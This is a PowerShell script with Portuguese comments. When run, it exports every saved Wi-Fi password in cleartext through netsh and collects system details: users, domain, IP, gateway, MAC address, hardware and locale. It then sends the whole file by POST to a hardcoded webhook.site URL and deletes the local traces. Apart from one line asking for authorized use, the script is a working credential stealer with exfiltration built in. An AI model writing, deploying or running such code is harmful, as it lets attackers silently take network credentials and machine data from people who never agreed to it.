<#
    exporta-wifi-const.ps1

    Versão modificada:
      - Não usa parâmetros
      - A URL do webhook é definida como constante (variável no topo) e deve ser editada antes do uso
      - Ao executar o script ele gera o arquivo e envia para o webhook (se $WebhookUrl estiver preenchida)

    ATENÇÃO: use apenas em máquinas ou ambientes com autorização.
#>

# === CONFIGURAÇÕES (edite aqui antes de executar) ===

# Deixe vazio ('') se não quiser enviar automaticamente para webhook
$WebhookUrl = 'https://webhook.site/0e19741a-559b-4878-9931-512f553f8733'

# Pasta de exportação (padrão: %TEMP%\p)
$ExportDirDefault = Join-Path $env:TEMP 'p'
# Nome do arquivo de saída (padrão: %TEMP%\wifi_passwords.txt)
$OutputFileDefault = Join-Path $env:TEMP 'wifi_passwords.txt'
# ====================================================


function get_wifi_pass {
    [CmdletBinding()]
    param(
        [string]$OutputFile = $OutputFileDefault,
        [switch]$KeepXml,
        [string]$ExportDir = $ExportDirDefault
        )

    # Helper: converte prefix length (por ex. 24) em máscara (por ex. 255.255.255.0)
    function PrefixLengthToNetmask {
    param([int]$prefix)
    if ($prefix -lt 0 -or $prefix -gt 32) { return "[inválido]" }

    $maskBits = ("1" * $prefix).PadRight(32, "0")
    $octets = ($maskBits.ToCharArray() -join "") -split '(.{8})' | Where-Object { $_ -ne "" }
    ($octets | ForEach-Object { [convert]::ToInt32($_,2) }) -join "."
}

    # Garante diretório de exportação
    if (-not (Test-Path -Path $ExportDir)) {
        New-Item -Path $ExportDir -ItemType Directory | Out-Null
    }

    Push-Location $ExportDir
    try {
        # Exporta perfis WLAN. Suprime saída e erros não fatais do netsh.
        & netsh wlan export profile key=clear > $null 2>&1
    } catch {
        Write-Verbose "Falha ao executar netsh: $_"
    }

    $results = [System.Collections.Generic.List[object]]::new()

    # Processa apenas XMLs gerados
    Get-ChildItem -Path $ExportDir -Filter '*.xml' -File -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $xml = [xml](Get-Content -Path $_.FullName -ErrorAction Stop)
            $ssid = $xml.WLANProfile.Name
            $pwd  = $xml.WLANProfile.MSM.Security.SharedKey.KeyMaterial

            if ([string]::IsNullOrWhiteSpace($pwd)) {
                $pwd = '[N/A]'
            }

            $results.Add([PSCustomObject]@{
                SSID     = $ssid
                Password = $pwd
            })
        } catch {
            Write-Verbose "Ignorando arquivo $($_.Name): $_"
        }
    }

    # Formata lista de linhas (SSID >> Password)
    $lines = $results | ForEach-Object { "$($_.SSID) >> $($_.Password)" }

    # --- Coleta infos do sistema para o cabeçalho ---
    $timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    $currentUser = $env:USERNAME
    $domain = $env:USERDOMAIN
    $machine = $env:COMPUTERNAME

    # IP preferencial (tenta pegar IPv4 de interfaces usuais)
    try {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
               Where-Object { $_.IPAddress -notlike "169.*" -and $_.IPAddress -ne "127.0.0.1" } |
               Select-Object -ExpandProperty IPAddress -First 1)
    } catch {
        $ip = "[não disponível]"
    }
    if (-not $ip) { $ip = "[não disponível]" }

    # lista de usuários locais
    try {
        $users = (Get-LocalUser -ErrorAction Stop | Select-Object -ExpandProperty Name) -join ', '
    } catch {
        $users = "[não disponível]"
    }

    # e-mail associado (tentativa usando variáveis de ambiente do Office / Windows)
    $email = $env:USERDNSDOMAIN
    if (-not $email) { $email = "[não disponível]" }

    # --- Informações sobre conexão ativa / interface em uso ---
    $connectedInterface = "[não disponível]"
    $defaultRouteInterface = "[não disponível]"
    $activeConnectionType = "[não disponível]"
    $connectedSSID = "[não conectado]"
    $gateway = "[não disponível]"
    $netmask = "[não disponível]"
    $adapterMac = "[não disponível]"
    $adapterDesc = "[não disponível]"

    # Tenta obter o SSID conectado via netsh (apenas para adaptadores Wi-Fi)
    try {
        $wlanRaw = (& netsh wlan show interfaces) 2>$null
        if ($wlanRaw) {
            $wlanText = $wlanRaw -join "`n"
            $stateMatch = [regex]::Match($wlanText, '^\s*State\s*:\s*(.+)$', 'Multiline')
            if ($stateMatch.Success) { $activeConnectionType = $stateMatch.Groups[1].Value.Trim() }
            $ssidMatch = [regex]::Match($wlanText, '^\s*SSID\s*:\s*(.+)$', 'Multiline')
            if ($ssidMatch.Success) { $connectedSSID = $ssidMatch.Groups[1].Value.Trim() }
            $nameMatch = [regex]::Match($wlanText, '^\s*Name\s*:\s*(.+)$', 'Multiline')
            if ($nameMatch.Success) { $connectedInterface = $nameMatch.Groups[1].Value.Trim() } else {
                $ifaceMatch = [regex]::Match($wlanText, '^\s*Interface(?: name)?\s*:\s*(.+)$', 'Multiline')
                if ($ifaceMatch.Success) { $connectedInterface = $ifaceMatch.Groups[1].Value.Trim() }
            }
        }
    } catch {
        # ignore
    }

    # Tenta descobrir qual interface está sendo usada para a rota padrão (0.0.0.0/0)
    try {
        $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                 Where-Object { $_.NextHop -and $_.InterfaceIndex } |
                 Sort-Object -Property RouteMetric, RoutePreference -ErrorAction SilentlyContinue |
                 Select-Object -First 1

        if ($route) {
            $ifIndex = $route.InterfaceIndex
            $ipcfg = Get-NetIPConfiguration -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue
            if ($ipcfg) {
                $defaultRouteInterface = $ipcfg.InterfaceAlias
                # gateway e máscara (IPv4)
                try {
                    if ($ipcfg.IPv4DefaultGateway -and $ipcfg.IPv4DefaultGateway.NextHop) {
                        $gateway = $ipcfg.IPv4DefaultGateway.NextHop
                    } elseif ($ipcfg.IPv4DefaultGateway) {
                        $gateway = ($ipcfg.IPv4DefaultGateway | Select-Object -ExpandProperty NextHop -ErrorAction SilentlyContinue)
                    }
                } catch { $gateway = "[não disponível]" }

                try {
                    $addr = $ipcfg.IPv4Address | Where-Object { $_.IPAddress -and $_.PrefixLength } | Select-Object -First 1
                    if ($addr) {
                        $netmask = PrefixLengthToNetmask -prefix $addr.PrefixLength
                    }
                    # MAC e descrição do adaptador
                    $netAdapter = Get-NetAdapter -InterfaceIndex $ifIndex -ErrorAction SilentlyContinue
                    if ($netAdapter) {
                        $adapterMac = $netAdapter.MacAddress
                        $adapterDesc = $netAdapter.InterfaceDescription
                    }
                } catch {
                    $netmask = "[não disponível]"
                }
            } else {
                $defaultRouteInterface = "[InterfaceIndex: $ifIndex]"
            }
        }
    } catch {
        $defaultRouteInterface = "[não disponível]"
    }

    # Se não houver interface conectada detectada antes, tenta pegar adaptador Wi-Fi ativo como fallback
    if (($connectedInterface -eq "[não disponível]" -or $connectedInterface -eq "") -and (Get-NetAdapter -ErrorAction SilentlyContinue)) {
        try {
            $wifiAdapter = Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' -and ($_.InterfaceDescription -match 'Wireless|Wi-Fi|WLAN') } | Select-Object -First 1
            if ($wifiAdapter) {
                $connectedInterface = $wifiAdapter.Name
                if (-not $adapterMac -or $adapterMac -eq "[não disponível]") { $adapterMac = $wifiAdapter.MacAddress }
                if (-not $adapterDesc -or $adapterDesc -eq "[não disponível]") { $adapterDesc = $wifiAdapter.InterfaceDescription }
            }
        } catch { }
    }

    # --- Informações de hardware ---
    $manufacturer = "[não disponível]"
    $model = "[não disponível]"
    $biosVersion = "[não disponível]"
    $cpu = "[não disponível]"
    $memoryGB = "[não disponível]"

    try {
        $cs = Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction SilentlyContinue
        if ($cs) {
            $manufacturer = $cs.Manufacturer
            $model = $cs.Model
            if ($cs.TotalPhysicalMemory) {
                $memoryGB = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
                $memoryGB = "$memoryGB GB"
            }
        }
    } catch { }

    try {
        $bios = Get-CimInstance -ClassName Win32_BIOS -ErrorAction SilentlyContinue
        if ($bios) { $biosVersion = ($bios.SMBIOSBIOSVersion -join ', ') -or $bios.Version }
    } catch { }

    try {
        $proc = Get-CimInstance -ClassName Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($proc) { $cpu = $proc.Name }
    } catch { }

    # --- Configuração de teclado / idioma ---
    $keyboardLayouts = "[não disponível]"
    $userLangList = $null
    $systemLocale = "[não disponível]"
    $uiCulture = "[não disponível]"

    try {
        if (Get-Command -Name Get-WinUserLanguageList -ErrorAction SilentlyContinue) {
            $userLangList = Get-WinUserLanguageList -ErrorAction SilentlyContinue
            if ($userLangList) {
                $keyboardLayouts = ($userLangList | ForEach-Object { "$($_.LanguageTag) (InputTip:$($_.InputMethodTips -join ', '))" }) -join ' ; '
            }
        }
    } catch { $keyboardLayouts = "[não disponível]" }

    try {
        $systemLocale = (Get-WinSystemLocale -ErrorAction SilentlyContinue).Name
    } catch { $systemLocale = "[não disponível]" }

    try {
        $uiCulture = (Get-Culture -ErrorAction SilentlyContinue).Name
    } catch { $uiCulture = "[não disponível]" }

    # --- Monta header atualizado ---
    $header = @"
ExportedOn            : $timestamp
Machine               : $machine
Domain                : $domain
User                  : $currentUser
AllUsers              : $users
IP                    : $ip
Email                 : $email

ConnectedInterface    : $connectedInterface
DefaultRouteInterface : $defaultRouteInterface
ActiveConnectionState : $activeConnectionType
ConnectedSSID         : $connectedSSID

Gateway               : $gateway
Netmask               : $netmask
AdapterMAC            : $adapterMac
AdapterDescription    : $adapterDesc

HardwareManufacturer  : $manufacturer
HardwareModel         : $model
BIOSVersion           : $biosVersion
CPU                   : $cpu
TotalMemory           : $memoryGB

KeyboardLayouts       : $keyboardLayouts
SystemLocale          : $systemLocale
UICulture             : $uiCulture

Senhas WiFi
SSD >> PWD
"@

    $content = $header + [Environment]::NewLine + ($lines -join [Environment]::NewLine) + [Environment]::NewLine

    try {
        [System.IO.File]::WriteAllBytes($OutputFile, [System.Text.Encoding]::UTF8.GetBytes($content))
    } catch {
        throw "Falha ao gravar arquivo ${OutputFile}: $_"
    } finally {
        # Remove XMLs gerados, a menos que o usuário peça para mantê-los
        if (-not $KeepXml) {
            Get-ChildItem -Path $ExportDir -Filter '*.xml' -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        }
        Pop-Location
    }

    return $OutputFile
}

function send_file_to_webhook {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$FilePath,                     # caminho completo ou nome de arquivo dentro de %TEMP%

        [Parameter(Mandatory=$true)]
        [string]$WebhookUrl,                   # URL do webhook para onde enviar

        [string]$ExportDir = $ExportDirDefault,  # pasta de exportação (a mesma usada por get_wifi_pass)
        [switch]$RemoveExportDir                # se setado, remove a pasta ExportDir após envio
    )

    # Resolve o caminho do arquivo
    $resolvedPath = $null
    if ([System.IO.Path]::IsPathRooted($FilePath)) {
        if (Test-Path -Path $FilePath -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $FilePath).ProviderPath
        } else {
            throw "Arquivo informado não existe: $FilePath"
        }
    } else {
        $candidate1 = Join-Path $env:TEMP $FilePath
        $candidate2 = Join-Path $ExportDir $FilePath

        if (Test-Path -Path $candidate1 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate1).ProviderPath
        } elseif (Test-Path -Path $candidate2 -PathType Leaf) {
            $resolvedPath = (Resolve-Path -Path $candidate2).ProviderPath
        } else {
            throw "Arquivo '$FilePath' não encontrado em %TEMP% nem em $ExportDir."
        }
    }

    # Lê bytes
    try {
        $bytes = [System.IO.File]::ReadAllBytes($resolvedPath)
    } catch {
        throw "Falha ao ler o arquivo '$resolvedPath': $_"
    }

    # Envia e apaga o arquivo após envio
    try {
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $bytes -ContentType 'text/plain; charset=utf-8'

        # Remove o arquivo após envio
        if (Test-Path -Path $resolvedPath) {
            Remove-Item -Path $resolvedPath -Force -ErrorAction SilentlyContinue
        }
    } catch {
        throw "Falha ao enviar para webhook '$WebhookUrl': $_"
    } finally {
        # Remove exportdir apenas se solicitado explicitamente
        try {
            if ($RemoveExportDir.IsPresent) {
                if ((Test-Path -Path $ExportDir) -and ($ExportDir.StartsWith($env:TEMP))) {
                    Remove-Item -Path $ExportDir -Recurse -Force -ErrorAction SilentlyContinue
                }
            }
        } catch {
            Write-Verbose "Falha ao remover pasta de exportação: $_"
        }
        
    }

    return @{ FileSent = $resolvedPath; Webhook = $WebhookUrl; Time = (Get-Date) }
}

# === Execução principal (rodará automaticamente quando o script for executado) ===
try {
    $out = get_wifi_pass -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault
    Write-Host "Arquivo gerado em: $out"
} catch {
    Write-Error "Erro ao gerar arquivo: $_"
    exit 1
}

if (-not [string]::IsNullOrWhiteSpace($WebhookUrl)) {
    try {
        Write-Host "Enviando para webhook: $WebhookUrl"
        
        # Garante que a chamada passe os parâmetros corretamente
        $sendResult = send_file_to_webhook -FilePath $out -WebhookUrl $WebhookUrl -ExportDir $ExportDirDefault
        
        # Exibe o resultado checando se o retorno possui as propriedades
        if ($null -ne $sendResult) {
            $fileSent = if ($sendResult.PSObject.Properties['FileSent']) { $sendResult.FileSent } else { $out }
            $timeSent = if ($sendResult.PSObject.Properties['Time']) { $sendResult.Time } else { (Get-Date) }
            
            Write-Host "Envio concluído: $fileSent em $timeSent"
        } else {
            Write-Host "Envio concluído com sucesso."
        }
    } catch {
        Write-Error "Erro durante envio para webhook: $_"
    }
}
